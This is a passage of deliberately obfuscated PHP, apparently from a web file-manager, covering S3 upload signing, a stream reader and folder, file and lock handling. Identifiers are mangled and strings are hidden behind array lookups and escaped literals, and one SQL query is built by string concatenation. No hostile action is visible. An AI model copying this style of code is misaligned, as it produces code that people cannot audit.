$this->isFolder($ø¢…¥è); } public function isFile($Ö°ìöï¤) { return !$this->isFolder($Ö°ìöï¤) && $this->objectMeta($Ö°ìöï¤); } public function isFolder($Í” õ’Î) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][166], $Í” õ’Î); } protected function objectMeta($Ó¼É¦§) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][168], $Ó¼É¦§); } protected function _objectMeta($¯…­É’ß) { $èŒë˜À¨ =& $_SERVER[—ÌÒğš÷]; list($ÉúèÃ´ı, $‹ß¥ŒÉÑ) = $this->bucketManager->stat($this->bucket, $¯…­É’ß); if ($ÉúèÃ´ı) { $ÉúèÃ´ı[$èŒë˜À¨[76]] = intval($ÉúèÃ´ı[$èŒë˜À¨[1456]]); } return $ÉúèÃ´ı; } protected function _isFolder($Íù¿­Í) { $×¬Ã»ã =& $_SERVER[—ÌÒğš÷]; if ($Íù¿­Í == $×¬Ã»ã[12] || $Íù¿­Í == $×¬Ã»ã[8]) { return !0; } list($ı÷ÌĞÍ, $óÏƒÉş·) = $this->bucketManager->listFiles($this->bucket, trim($Íù¿­Í, $×¬Ã»ã[8]) . $×¬Ã»ã[8], $×¬Ã»ã[12], 1, $×¬Ã»ã[8]); return !empty($ı÷ÌĞÍ[$×¬Ã»ã[1459]]) || !empty($ı÷ÌĞÍ[$×¬Ã»ã[1460]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¦–»éë³) { parent::__construct($¦–»éë³); } public function uploadFormData($ÁÆİšßÍ, $¡…§ºğ± = 3600) { $…€Š©†å =& $_SERVER[—ÌÒğš÷]; $èˆ˜¢ Ê = $…€Š©†å[213]; $ êŸŞÅà = $…€Š©†å[253]; $Ó¹ÉßŞº = $…€Š©†å[62]; $şÊ‡‘ê‰ = gmdate($…€Š©†å[254]); $Ç î¢§ = gmdate($…€Š©†å[255]); $íÉ–­‹§ = $…€Š©†å[256]; $“·Œ£”Œ = $¡…§ºğ± . $…€Š©†å[12]; $‰ÉÖø› = $…€Š©†å[257]; $ÈŠãäœ… = array($this->accessKey, $Ç î¢§, $this->region, $Ó¹ÉßŞº, $íÉ–­‹§); $ì§ “¿ë = implode($…€Š©†å[8], $ÈŠãäœ…); $ñ¾ìóãò = array($…€Š©†å[258] => gmdate($…€Š©†å[1368], strtotime($…€Š©†å[260])), $…€Š©†å[261] => array(array($…€Š©†å[262] => $this->bucket), array($…€Š©†å[263] => $èˆ˜¢ Ê), array($…€Š©†å[264], $…€Š©†å[265], $…€Š©†å[12]), array($…€Š©†å[264], $…€Š©†å[266], $…€Š©†å[12]), array($…€Š©†å[264], $…€Š©†å[267], $…€Š©†å[12]), array($…€Š©†å[268] => $‰ÉÖø›), array($…€Š©†å[269] => $ì§ “¿ë), array($…€Š©†å[270] => $ êŸŞÅà), array($…€Š©†å[271] => $şÊ‡‘ê‰), array($…€Š©†å[272] => $“·Œ£”Œ))); $äË­¶š— = base64_encode(json_encode($ñ¾ìóãò)); $°§ÜÚü¡ = hash_hmac($…€Š©†å[273], $Ç î¢§, $…€Š©†å[274] . $this->secret, !0); $æ…Š±œú = hash_hmac($…€Š©†å[273], $this->region, $°§ÜÚü¡, !0); $¸¨¼ØÓ² = hash_hmac($…€Š©†å[273], $Ó¹ÉßŞº, $æ…Š±œú, !0); $¼şÒ£¹ = hash_hmac($…€Š©†å[273], $íÉ–­‹§, $¸¨¼ØÓ², !0); $„•‡¾®Û = hash_hmac($…€Š©†å[273], $äË­¶š—, $¼şÒ£¹); $şãııöò = array($…€Š©†å[230] => $…€Š©†å[12], $…€Š©†å[275] => $…€Š©†å[12], $…€Š©†å[263] => $èˆ˜¢ Ê, $…€Š©†å[268] => $‰ÉÖø›, $…€Š©†å[276] => $äË­¶š—, $…€Š©†å[277] => $ì§ “¿ë, $…€Š©†å[278] => $ êŸŞÅà, $…€Š©†å[279] => $şÊ‡‘ê‰, $…€Š©†å[280] => $“·Œ£”Œ, $…€Š©†å[281] => $„•‡¾®Û, $…€Š©†å[196] => $this->getHost()); return $şãııöò; } public function multiUploadFormData($úéœ¨Œá, $ì”÷ÒÍñ = 3600) { $ÀÎ±å¡ =& $_SERVER[—ÌÒğš÷]; $ Ôï‡Â = gmdate($ÀÎ±å¡[1471]); $œŠåû•ï = array(); $ÔüïÊà = $this->client->getUploadId($this->bucket, $úéœ¨Œá, $œŠåû•ï); if (!$ÔüïÊà) { return !1; } return array($ÀÎ±å¡[238] => $ÔüïÊà, $ÀÎ±å¡[196] => $this->getHost() . $ÀÎ±å¡[8] . $this->pathEncode($úéœ¨Œá), $ÀÎ±å¡[239] => $ Ôï‡Â, $ÀÎ±å¡[94] => $úéœ¨Œá); } public function multiUploadAuthData($ìÕ™å®ú, $’Ûçùû = array()) { $èšíÛ¨  =& $_SERVER[—ÌÒğš÷]; $Üå„´—— = isset($’Ûçùû[$èšíÛ¨ [175]]) ? $’Ûçùû[$èšíÛ¨ [175]] : $èšíÛ¨ [12]; $ñÇÕıûé = $’Ûçùû[$èšíÛ¨ [94]]; unset($’Ûçùû[$èšíÛ¨ [94]]); if (isset($’Ûçùû[$èšíÛ¨ [240]])) { return $this->listUploadParts($ñÇÕıûé, $’Ûçùû); } $‡ìé§Ü³ = array(); if (isset($’Ûçùû[$èšíÛ¨ [1472]])) { $‡ìé§Ü³[$èšíÛ¨ [1473]] = $’Ûçùû[$èšíÛ¨ [1472]]; } $Ê·ğä• = explode($èšíÛ¨ [198], $this->getHost()); $ã‰¡ËŸø = array($èšíÛ¨ [1474] => $Ê·ğä•[1], $èšíÛ¨ [1475] => $èšíÛ¨ [12], $èšíÛ¨ [230] => $èšíÛ¨ [120], $èšíÛ¨ [275] => $’Ûçùû[$èšíÛ¨ [76]]); $¬²£“‚‘ = $èšíÛ¨ [243]; $Äİİõ³ = $èšíÛ¨ [8] . $this->pathEncode($ñÇÕıûé) . $Üå„´——; $ô—ºüÑÀ = $this->client->__getSignatureV4($‡ìé§Ü³, $ã‰¡ËŸø, $¬²£“‚‘, $Äİİõ³); if (strpos($Üå„´——, $èšíÛ¨ [242]) === 0) { if (isset($‡ìé§Ü³[$èšíÛ¨ [1473]])) { $È© Ê¡Ç = $‡ìé§Ü³[$èšíÛ¨ [1473]]; } else { if (isset($ô—ºüÑÀ[$èšíÛ¨ [1473]])) { $È© Ê¡Ç = $ô—ºüÑÀ[$èšíÛ¨ [1473]]; } else { $È© Ê¡Ç = hash($èšíÛ¨ [273], $èšíÛ¨ [12]); } } return array($èšíÛ¨ [249] => $ô—ºüÑÀ[$èšíÛ¨ [249]], $èšíÛ¨ [1473] => $È© Ê¡Ç, $èšíÛ¨ [239] => $ô—ºüÑÀ[$èšíÛ¨ [1476]]); } return $ô—ºüÑÀ[$èšíÛ¨ [249]]; } public function listUploadParts($²¬‘ˆ…—, $º«ÔÔÂ = array()) { $ìóÜÕöè =& $_SERVER[—ÌÒğš÷]; $¬´Ş™¸£ = str_replace($ìóÜÕöè[250], $ìóÜÕöè[12], $º«ÔÔÂ[$ìóÜÕöè[175]]); $‡äïÈ † = $this->client->listParts($this->bucket, $²¬‘ˆ…—, $¬´Ş™¸£); if (!$‡äïÈ †) { return !1; } $´æì„—” = $ìóÜÕöè[1477]; foreach ($‡äïÈ † as $‹­´óÂº) { $´æì„—” .= $ìóÜÕöè[1478] . "\x3c\120\141\162\164\x4e\x75\155\142\145\x72\x3e{$‹­´óÂº[$ìóÜÕöè[1433]]}\x3c\x2f\120\141\162\164\x4e\165\x6d\x62\145\162\76\12" . "\74\x45\x54\x61\x67\76{$‹­´óÂº[$ìóÜÕöè[1434]]}\x3c\57\x45\124\x61\147\76\xa" . $ìóÜÕöè[1479]; } $´æì„—” .= $ìóÜÕöè[1480]; $´î€•‚‡ = array(); $“¬Ô…ó‰ = explode($ìóÜÕöè[198], $this->getHost()); $ööêÆ©ç = array($ìóÜÕöè[1474] => $“¬Ô…ó‰[1], $ìóÜÕöè[230] => $ìóÜÕöè[120], $ìóÜÕöè[275] => strlen($´æì„—”)); $‡”×•Œ¾ = $ìóÜÕöè[241]; $±á¡Ó³… = $ìóÜÕöè[8] . $this->pathEncode($²¬‘ˆ…—) . $º«ÔÔÂ[$ìóÜÕöè[175]]; $»ïğÀÓ = $this->client->__getSignatureV4($´î€•‚‡, $ööêÆ©ç, $‡”×•Œ¾, $±á¡Ó³…, $´æì„—”); return array($ìóÜÕöè[249] => $»ïğÀÓ[$ìóÜÕöè[249]], $ìóÜÕöè[239] => $»ïğÀÓ[$ìóÜÕöè[1476]], $ìóÜÕöè[251] => $‡äïÈ †, $ìóÜÕöè[1473] => $»ïğÀÓ[$ìóÜÕöè[1473]]); } public function link($ñàõµ¡±, $Ò×ùŠŒ™ = array()) { return parent::link($ñàõµ¡±, $Ò×ùŠŒ™); } public function fileOut($¢†Ÿ¶¡, $—Ï·üê = false, $ë÷”ÎÒÃ = false, $†®Â¾  = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[—ÌÒğš÷][1481])) { return parent::fileOutServer($¢†Ÿ¶¡, $—Ï·üê, $ë÷”ÎÒÃ, $†®Â¾ ); } parent::fileOut($¢†Ÿ¶¡, $—Ï·üê, $ë÷”ÎÒÃ, $†®Â¾ ); } public function fileOutImage($¼˜äœ‹Ğ, $»¸—½Æº = 250) { if (strstr($this->endpoint, $_SERVER[—ÌÒğš÷][1481])) { return parent::fileOutImageServer($¼˜äœ‹Ğ, $»¸—½Æº); } parent::fileOutImage($¼˜äœ‹Ğ, $»¸—½Æº); } public function fileOutLink($Õ˜× œÓ) { $àÆÙ½Àî =& $_SERVER[—ÌÒğš÷]; if (substr($Õ˜× œÓ, 0, 7) == $àÆÙ½Àî[1374]) { $Õ˜× œÓ = $àÆÙ½Àî[1375] . substr($Õ˜× œÓ, 7); } header($àÆÙ½Àî[162] . $Õ˜× œÓ); die; } public function getHost() { $€Ãõ¿øî =& $_SERVER[—ÌÒğš÷]; $¦è²ãùú = str_rtrim(parent::getHost(), $€Ãõ¿øî[8] . $this->bucket); $¦è²ãùú = explode($€Ãõ¿øî[198], $¦è²ãùú); return $¦è²ãùú[0] . $€Ãõ¿øî[198] . $this->bucket . $€Ãõ¿øî[10] . $¦è²ãùú[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Àµƒ†‡ø, $ßøôšİ´ = 0) { parent::__construct(); $this->source = $Àµƒ†‡ø; $this->sourceSize = $ßøôšİ´; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($­¡‰áì§ = false) { return $this->sourceSize; } public function getContent($Û¤€Òå  = false) { return $this->fileSubstr($Û¤€Òå , 0, $this->sourceSize); } public function fileSubstr($­¬ÖµÎ× = false, $š—ˆèœ® = 0, $è¹’ßñî = 0) { if (!$è¹’ßñî) { $è¹’ßñî = $this->sourceSize; } $øÁœÔãŒ = $this->sourceSize - $š—ˆèœ®; if ($è¹’ßñî >= $øÁœÔãŒ) { $è¹’ßñî = $øÁœÔãŒ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $š—ˆèœ®, $è¹’ßñî); } if ($this->sourceType == self::TYPE_FILE) { if ($è¹’ßñî <= 0) { return $_SERVER[—ÌÒğš÷][12]; } $œâÈ„êü = ftell($this->source); fseek_64($this->source, $œâÈ„êü + $š—ˆèœ®); $‚Ë‡™İÄ = @fread($this->source, $è¹’ßñî); fseek_64($this->source, $œâÈ„êü); return $‚Ë‡™İÄ; } } public function hashMd5($ıÒ™äÔú = false) { return md5($this->getContent()); } public static function hash($˜úÚİ«Õ, $×İáö“ê = 0) { $åªº²šå = new PathDriverStream($˜úÚİ«Õ, $×İáö“ê); return $åªº²šå->hashSimple($˜úÚİ«Õ); } public static function md5($©£¡»±, $îíì§È¡ = 0) { $‰Ûã‹”• = new PathDriverStream($©£¡»±, $îíì§È¡); return $‰Ûã‹”•->hashMd5($©£¡»±); } } goto dÊ´Î…Ø±; a¯í¬æ¦Áä: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($«ãŸôë¹) { $Ó¼åÑ´ =& $_SERVER[—ÌÒğš÷]; $î÷Ë¾­œ = Model($Ó¼åÑ´[546])->where(array($Ó¼åÑ´[1679] => $«ãŸôë¹))->find(); $äÕìßâ = $this->_mkdirRoot(SourceModel::TYPE_USER, $«ãŸôë¹, $î÷Ë¾­œ[$Ó¼åÑ´[32]]); $this->userDesktopAdd($äÕìßâ); return $äÕìßâ; } public function userDesktopAdd($À¥ï„¼ø) { $ğúÖÙıª =& $_SERVER[—ÌÒğš÷]; $¿Æ’€¥Ñ = LNG($ğúÖÙıª[2160]); $œÄº†Úß = $this->mkdir($À¥ï„¼ø, $¿Æ’€¥Ñ); $this->metaSet($œÄº†Úß, $ğúÖÙıª[2161], $ğúÖÙıª[88]); $this->metaSet($À¥ï„¼ø, $ğúÖÙıª[2162], $œÄº†Úß); } public function userPathSafeAdd($Å×œËı) { $›øúÈ£ =& $_SERVER[—ÌÒğš÷]; $ü¬º°úƒ = Model($›øúÈ£[546])->getInfoFull($Å×œËı); if (!$ü¬º°úƒ) { return !1; } if (_get($ü¬º°úƒ, $›øúÈ£[568])) { return $ü¬º°úƒ[$›øúÈ£[507]][$›øúÈ£[2163]]; } $Š·­¡İç = $this->_mkdirRoot(SourceModel::TYPE_USER, $Å×œËı, $›øúÈ£[2164], $›øúÈ£[474]); Model($›øúÈ£[546])->metaSet($Å×œËı, $›øúÈ£[2163], $Š·­¡İç); $this->metaSet($Š·­¡İç, $›øúÈ£[2165], $Å×œËı); return $Š·­¡İç; } public function groupRootAdd($¶Î¡ÍøÚ) { $ëæ×î»  =& $_SERVER[—ÌÒğš÷]; $¸˜‘‹§ã = Model($ëæ×î» [554])->where(array($ëæ×î» [1975] => $¶Î¡ÍøÚ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¶Î¡ÍøÚ, $¸˜‘‹§ã[$ëæ×î» [32]]); } public function systemRootPathAdd($àÎÁ“Ò) { if ($àÎÁ“Ò != $_SERVER[—ÌÒğš÷][574]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $àÎÁ“Ò); } public function userRootRemove($Ø÷¹ ) { $ñ‹Ÿ—İ’ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ø÷¹ , !0); foreach ($ñ‹Ÿ—İ’ as $²ê†Êï) { if (!$²ê†Êï) { continue; } $this->remove($²ê†Êï[$_SERVER[—ÌÒğš÷][181]], !1); } } public function groupRootRemove($Ñ±üò«) { $Ô«ÆÛÎŒ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ñ±üò«); if (!$Ô«ÆÛÎŒ) { return; } $this->remove($Ô«ÆÛÎŒ[$_SERVER[—ÌÒğš÷][181]], !1); } private function _mkdirRoot($Ö£»»†ß, $ÀäºéÉà, $¶…à¼º¨, $Ãñ…À› = '') { $ù÷é¿â =& $_SERVER[—ÌÒğš÷]; $şêĞš µ = defined($ù÷é¿â[2108]) ? USER_ID : 0; $åÑëÉÛ = array($ù÷é¿â[445] => 0, $ù÷é¿â[616] => $Ö£»»†ß, $ù÷é¿â[617] => $ÀäºéÉà, $ù÷é¿â[614] => 1, $ù÷é¿â[618] => $şêĞš µ, $ù÷é¿â[619] => $şêĞš µ, $ù÷é¿â[615] => $Ãñ…À›, $ù÷é¿â[620] => $ù÷é¿â[563], $ù÷é¿â[472] => 0, $ù÷é¿â[585] => 0, $ù÷é¿â[510] => 0, $ù÷é¿â[621] => $ù÷é¿â[12]); if ($Æ‘»¢Æ = $this->where($åÑëÉÛ)->find()) { return $Æ‘»¢Æ[$ù÷é¿â[181]]; } $’ŒÏê·Œ = "\x4d\x6f\x64\145\x6c\123\x6f\x75\162\x63\145\56\155\x6b\x64\151\162\122\157\157\164\x2e{$Ö£»»†ß}\x2e{$ÀäºéÉà}\56" . $¶…à¼º¨; CacheLock::lock($’ŒÏê·Œ); $åÑëÉÛ[$ù÷é¿â[32]] = $¶…à¼º¨; $œ“ùŠ—× = $this->add($åÑëÉÛ); $Ğ“¯«ó­ = array($ù÷é¿â[622] => short_id($œ“ùŠ—×)); $this->where(array($ù÷é¿â[459] => $œ“ùŠ—×))->save($Ğ“¯«ó­); CacheLock::unlock($’ŒÏê·Œ); return $œ“ùŠ—×; } private function targetSourceRoot($Í¶ôƒÏ•, $ö¯ŸÔ , $ş³Ûïœ† = false) { $ùÛÚ•É³ =& $_SERVER[—ÌÒğš÷]; $¨ÆÇé = array($ùÛÚ•É³[445] => 0, $ùÛÚ•É³[616] => $Í¶ôƒÏ•, $ùÛÚ•É³[617] => $ö¯ŸÔ ); if ($ş³Ûïœ†) { $‘¤ñÆÁÏ = $this->where($¨ÆÇé)->select(); return $‘¤ñÆÁÏ ? $‘¤ñÆÁÏ : array(); } $¥Ø¦‰î = $this->where($¨ÆÇé)->find(); return $¥Ø¦‰î ? $¥Ø¦‰î : array(); } public function sourceRootGroup($®ÏØ§«) { $‘áàÖÛ =& $_SERVER[—ÌÒğš÷]; if (is_string($®ÏØ§«)) { $®ÏØ§« = array($®ÏØ§«); } $üú°ê” = $this->listSourceRoot(SourceModel::TYPE_GROUP, $®ÏØ§«, $‘áàÖÛ[203]); $å¹ë¶ü = array($‘áàÖÛ[413] => $üú°ê”, $‘áàÖÛ[410] => array($‘áàÖÛ[794] => count($®ÏØ§«))); $this->_listDataApply($å¹ë¶ü[$‘áàÖÛ[413]]); $this->_listMake($å¹ë¶ü); return array_to_keyvalue($å¹ë¶ü[$‘áàÖÛ[82]], $‘áàÖÛ[538]); } public function mkfile($šó“œÔ¥, $ğÀ×ÁÈá, $‹Äî×úá = '', $ğËõ¶º = REPEAT_RENAME) { $ÙÂ‘×å¤ =& $_SERVER[—ÌÒğš÷]; $šøë§¶ = Model($ÙÂ‘×å¤[643])->addFileByContent($‹Äî×úá, $ğÀ×ÁÈá); return $this->_createFileCall($šó“œÔ¥, $ğÀ×ÁÈá, $šøë§¶, $ğËõ¶º, $ÙÂ‘×å¤[1386]); } public function addFile($«İ¼£, $é‚Àş˜, $‘™—ƒ¹, $©­ì„•Š = false, $Ø°í¤©² = REPEAT_RENAME) { $æ ¯¢ê = Model($_SERVER[—ÌÒğš÷][643])->addFile($é‚Àş˜, $‘™—ƒ¹, $©­ì„•Š); return $this->_createFileCall($«İ¼£, $‘™—ƒ¹, $æ ¯¢ê, $Ø°í¤©²); } public function addFileByFileID($›ù÷î‡Ğ, $ËÎ‡™ÑÅ, $ÛÏßˆ¤ë, $“Úğ °“ = REPEAT_RENAME) { $ÚŠ‡Ñ¥« =& $_SERVER[—ÌÒğš÷]; $”ã¹§¬€ = Model($ÚŠ‡Ñ¥«[643])->find($ËÎ‡™ÑÅ); Model($ÚŠ‡Ñ¥«[643])->linkAdd($ËÎ‡™ÑÅ); return $this->_createFileCall($›ù÷î‡Ğ, $ÛÏßˆ¤ë, $”ã¹§¬€, $“Úğ °“); } public function addFileByRemote($·“à„úê, $ù¸şÒÑ, $º†áÛšù, $“°ì¤şş = array(), $´ôœÎä = REPEAT_RENAME) { $äÇÊ’”„ = Model($_SERVER[—ÌÒğš÷][643])->addFileByRemote($ù¸şÒÑ, $º†áÛšù, $“°ì¤şş); return $this->_createFileCall($·“à„úê, $º†áÛšù, $äÇÊ’”„, $´ôœÎä); } private function _createFileCall($´ü²ÈÁ, $×ÍÜ”÷¿, $ö¾ÆîÎ–, $ª©ğ¤‡Ş, $øîøÔ›ä = "\165\x70\154\157\141\x64") { $ë ¾™‘ =& $_SERVER[—ÌÒğš÷]; $™òÓş¹ë = !1; $this->setMasterDB(); $this->lockWriteStart($´ü²ÈÁ, $×ÍÜ”÷¿); $© Ó›Ğç = $this->fileNameExist($´ü²ÈÁ, $×ÍÜ”÷¿); $õ‰´äÉ‹ = $this->_createFile($´ü²ÈÁ, $×ÍÜ”÷¿, $ö¾ÆîÎ–, $ª©ğ¤‡Ş, $™òÓş¹ë); if (!$™òÓş¹ë) { Model($ë ¾™‘[512])->remove($ö¾ÆîÎ–[$ë ¾™‘[509]]); } if ($™òÓş¹ë && $õ‰´äÉ‹ && $õ‰´äÉ‹ != $© Ó›Ğç) { Model($ë ¾™‘[2133])->eventCreate($õ‰´äÉ‹, $øîøÔ›ä); } $this->lockWriteEnd($´ü²ÈÁ, $×ÍÜ”÷¿); return $õ‰´äÉ‹; } public function mkdir($èçÄĞê, $…úğŸø‰, $«çÑ±­ = REPEAT_SKIP) { $õî­ôí‚ =& $_SERVER[—ÌÒğš÷]; $this->setMasterDB(); $®è‹çî… = $this->sourceInfo($èçÄĞê); if (!$®è‹çî…) { return !1; } $this->lockWriteStart($èçÄĞê, $…úğŸø‰); if ($«çÑ±­ !== !1) { $Â¯ÉÏ¦ß = $this->fileNameExist($èçÄĞê, $…úğŸø‰); if ($Â¯ÉÏ¦ß && $«çÑ±­ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($èçÄĞê, $…úğŸø‰); return $Â¯ÉÏ¦ß; } $…úğŸø‰ = $this->fileNameAuto($èçÄĞê, $…úğŸø‰, $«çÑ±­); } $ËÚªÖŞ˜ = array($õî­ôí‚[614] => 1, $õî­ôí‚[462] => $…úğŸø‰, $õî­ôí‚[615] => $õî­ôí‚[12], $õî­ôí‚[510] => 0, $õî­ôí‚[585] => 0); $Ô¥™Áíù = $this->_addSource($ËÚªÖŞ˜, $®è‹çî…); Model($õî­ôí‚[2133])->eventCreate($Ô¥™Áíù, $õî­ôí‚[1387]); $this->lockWriteEnd($èçÄĞê, $…úğŸø‰); return $Ô¥™Áíù; } public function listSourceRoot($¨ášõ¬Ë, $¸ÑêÈ£ë, $ğÁ®ƒúÖ = "\x73\x6f\x75\x72\143\x65\x49\x44\54\164\141\162\x67\145\164\x49\x44\54\x73\151\172\x65") { $¨¨¬İ® =& $_SERVER[—ÌÒğš÷]; $£áÍõ¸¶ = $¨¨¬İ®[422]; $øÕê®®† = array(); $ÀÖ¶‰ = 1024 * 50; $úŞ¡¼õ = is_array($úŞ¡¼õ) ? $úŞ¡¼õ : array(); $¹Ù®ÔŞ = count($¸ÑêÈ£ë); $¾Õ…èË = $this->tablePrefix . $¨¨¬İ®[2166]; for ($Ø™«Ì¡Ã = 0; $Ø™«Ì¡Ã < $¹Ù®ÔŞ; $Ø™«Ì¡Ã++) { $š¹ü›Á¤ = $¸ÑêÈ£ë[$Ø™«Ì¡Ã]; $£áÍõ¸¶ .= "\123\105\114\x45\103\124\x20\x2a\40\106\x52\117\x4d\40\50\x53\105\114\x45\103\124\x20{$ğÁ®ƒúÖ}\40\x46\x52\x4f\115\x20\140{$¾Õ…èË}\140\x20\127\110\105\122\105\40"; $£áÍõ¸¶ .= "\x60\x70\x61\x72\x65\156\x74\x49\x44\x60\75\60\40\101\116\x44\40\x60\x74\x61\162\147\x65\x74\x49\104\140\75{$š¹ü›Á¤}\x20\x41\x4e\x44\x20\x60\x74\x61\162\x67\x65\164\124\x79\x70\x65\140\75{$¨ášõ¬Ë}\x20\x61\156\144\x20\x66\x69\x6c\x65\124\x79\160\x65\75\x27\47\x20\x6c\151\155\151\164\x20\61\x29\x20\x61\x73\40\164\x62\x5f{$Ø™«Ì¡Ã}\x20\x55\x4e\111\x4f\116\x20\101\x4c\114\40"; if ((strlen($£áÍõ¸¶) >= $ÀÖ¶‰ || $Ø™«Ì¡Ã == $¹Ù®ÔŞ - 1) && $£áÍõ¸¶) { $£áÍõ¸¶ = substr($£áÍõ¸¶, 0, -strlen($¨¨¬İ®[1082])); $á»‘Ìò = $this->query($£áÍõ¸¶); $£áÍõ¸¶ = $¨¨¬İ®[12]; $øÕê®®† = array_merge($øÕê®®†, $á»‘Ìò); } } return $øÕê®®†; } private function _createFile($ı«­³ªÂ, $çúíÓÔ, $”ÆÒÙ¢†, $Óèàïøı, &$·á‰à—ª) { $¹áüğ´º =& $_SERVER[—ÌÒğš÷]; $£ôŒ¹Ğì = $this->sourceInfo($ı«­³ªÂ); if (!$”ÆÒÙ¢† || !$£ôŒ¹Ğì) { return !1; } if ($Óèàïøı !== !1) { $Ö¢”îšˆ = $this->fileNameExist($ı«­³ªÂ, $çúíÓÔ); } $·á‰à—ª = !0; if ($Óèàïøı && $Ö¢”îšˆ) { if ($Óèàïøı == REPEAT_SKIP) { $·á‰à—ª = !1; return $Ö¢”îšˆ; } else { if ($Óèàïøı == REPEAT_REPLACE) { $ïêÄÙë“ = $this->sourceInfo($Ö¢”îšˆ); $­„™’ı‹ = $this->fileHistory($ïêÄÙë“, $”ÆÒÙ¢†[$¹áüğ´º[509]], $”ÆÒÙ¢†[$¹áüğ´º[76]]); if (!$­„™’ı‹) { $·á‰à—ª = !1; } else { $this->folderSizeReset($ı«­³ªÂ); } return $Ö¢”îšˆ; } else { $çúíÓÔ = $this->fileNameAuto($ı«­³ªÂ, $çúíÓÔ, $Óèàïøı, !1); } } } $•Òüø£® = array($¹áüğ´º[614] => 0, $¹áüğ´º[462] => $çúíÓÔ, $¹áüğ´º[615] => substr(get_path_ext($çúíÓÔ), 0, 10), $¹áüğ´º[510] => $”ÆÒÙ¢†[$¹áüğ´º[509]], $¹áüğ´º[585] => $”ÆÒÙ¢†[$¹áüğ´º[76]]); $ïİ¤‰í¶ = $this->_addSource($•Òüø£®, $£ôŒ¹Ğì); $this->folderSizeReset($ı«­³ªÂ, intval($•Òüø£®[$¹áüğ´º[76]])); return $ïİ¤‰í¶; } protected function fileHistory($İş„ÔÄ, $“ò® ¸, $¦ ™Îªı) { $÷ÛùÚà =& $_SERVER[—ÌÒğš÷]; if ($İş„ÔÄ[$÷ÛùÚà[509]] == $“ò® ¸) { return !1; } $this->checkLock($İş„ÔÄ[$÷ÛùÚà[181]], $“ò® ¸); Model($÷ÛùÚà[2167])->addHistory($İş„ÔÄ); $¥çÏìÓÕ = array($÷ÛùÚà[619] => USER_ID, $÷ÛùÚà[466] => time(), $÷ÛùÚà[509] => $“ò® ¸, $÷ÛùÚà[76] => $¦ ™Îªı); $this->where(array($÷ÛùÚà[459] => $İş„ÔÄ[$÷ÛùÚà[181]]))->save($¥çÏìÓÕ); $this->sourceCacheClear($İş„ÔÄ[$÷ÛùÚà[181]]); return !0; } public function checkLock($ø¶¬¤ , $ºÛ‡¯¨ø) { $•ù—éáá =& $_SERVER[—ÌÒğš÷]; $Ë•£ƒ¼ = $this->pathInfo($ø¶¬¤ ); if (!$this->fileIsLock($Ë•£ƒ¼, !0)) { return; } $Ô£÷€¥û = Session::get($•ù—éáá[2168]); $‰‹øÙÌ = substr($Ë•£ƒ¼[$•ù—éáá[32]], 0, -1 - strlen($Ë•£ƒ¼[$•ù—éáá[175]])) . $•ù—éáá[1252] . $Ô£÷€¥û . $•ù—éáá[10] . $Ë•£ƒ¼[$•ù—éáá[175]]; $Ì­´Åš = Model($•ù—éáá[643])->find($ºÛ‡¯¨ø); $this->_createFileCall($Ë•£ƒ¼[$•ù—éáá[180]], $‰‹øÙÌ, $Ì­´Åš, REPEAT_REPLACE, $•ù—éáá[1386]); $„âüĞÔ = $Ë•£ƒ¼[$•ù—éáá[507]][$•ù—éáá[578]]; $°Ñ”õ¸º = $„âüĞÔ[$•ù—éáá[2169]] ? $„âüĞÔ[$•ù—éáá[2169]] : $„âüĞÔ[$•ù—éáá[32]]; show_json(LNG($•ù—éáá[2170]) . $•ù—éáá[2171] . LNG($•ù—éáá[2172]) . $•ù—éáá[2173] . $°Ñ”õ¸º . $•ù—éáá[2174], !1); } public function fileIsLock($âü±éŞ€, $ˆ˜¿ëÖ· = false) { $Î·ñ¿±« =& $_SERVER[—ÌÒğš÷]; if (!isset($âü±éŞ€[$Î·ñ¿±«[507]]) || !$âü±éŞ€[$Î·ñ¿±«[507]][$Î·ñ¿±«[575]]) { return !1; } if ($âü±éŞ€[$Î·ñ¿±«[507]][$Î·ñ¿±«[575]] != USER_ID) { return !0; } $Êû¸ĞÏË = $GLOBALS[$Î·ñ¿±«[6]][$Î·ñ¿±«[89]][$Î·ñ¿±«[576]]; if ($âü±éŞ€[$Î·ñ¿±«[507]][$Î·ñ¿±«[577]] <= time() - $Êû¸ĞÏË) { $this->metaSet($âü±éŞ€[$Î·ñ¿±«[181]], $Î·ñ¿±«[575], null); $this->metaSet($âü±éŞ€[$Î·ñ¿±«[181]], $Î·ñ¿±«[577], null); } if ($ˆ˜¿ëÖ·) { $this->metaSet($âü±éŞ€[$Î·ñ¿±«[181]], $Î·ñ¿±«[577], time()); } return !1; } private function _addSource($»½àÎæ¬, $âö§Ñø‘) { $‚µÑªø¸ =& $_SERVER[—ÌÒğš÷]; $ú³¼­­ = defined($‚µÑªø¸[2108]) ? USER_ID : 0; $„ßƒóìœ = array($‚µÑªø¸[616] => $âö§Ñø‘[$‚µÑªø¸[178]], $‚µÑªø¸[617] => $âö§Ñø‘[$‚µÑªø¸[538]], $‚µÑªø¸[618] => $ú³¼­­, $‚µÑªø¸[619] => $ú³¼­­, $‚µÑªø¸[445] => $âö§Ñø‘[$‚µÑªø¸[181]], $‚µÑªø¸[620] => $âö§Ñø‘[$‚µÑªø¸[553]] . $âö§Ñø‘[$‚µÑªø¸[181]] . $‚µÑªø¸[50], $‚µÑªø¸[472] => 0, $‚µÑªø¸[621] => $‚µÑªø¸[12]); $»½àÎæ¬ = array_merge($„ßƒóìœ, $»½àÎæ¬); $this->updateModifyTime($»½àÎæ¬[$‚µÑªø¸[180]]); $Çµ„¦Òê = $‚µÑªø¸[2175] . $âö§Ñø‘[$‚µÑªø¸[181]]; if (isset(self::$cacheChildList[$Çµ„¦Òê])) { 